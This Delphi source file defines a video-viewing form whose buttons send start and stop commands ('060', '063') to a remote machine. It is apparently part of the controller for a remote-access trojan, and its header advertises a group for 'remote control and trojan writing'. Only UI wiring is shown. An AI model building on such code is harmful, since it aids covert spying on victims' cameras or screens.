unit Unit5;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, GR32_Image, ComCtrls;

type
  Tshipin = class(TForm)
    Button1: TButton;
    Button2: TButton;
    Panel1: TPanel;
    Image1: TImage;
    StatusBar1: TStatusBar;
    Panel2: TPanel;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  shipin: Tshipin;

implementation
uses
 Unit1;
{$R *.dfm}

procedure Tshipin.FormClose(Sender: TObject; var Action: TCloseAction);
begin
Form1.ZhuDongCmdSend('063','',false);
end;

procedure Tshipin.Button1Click(Sender: TObject);
begin
Form1.ZhuDongCmdSend('060','',false);
end;

procedure Tshipin.Button2Click(Sender: TObject);
begin
Form1.ZhuDongCmdSend('063','',false);
end;

end.
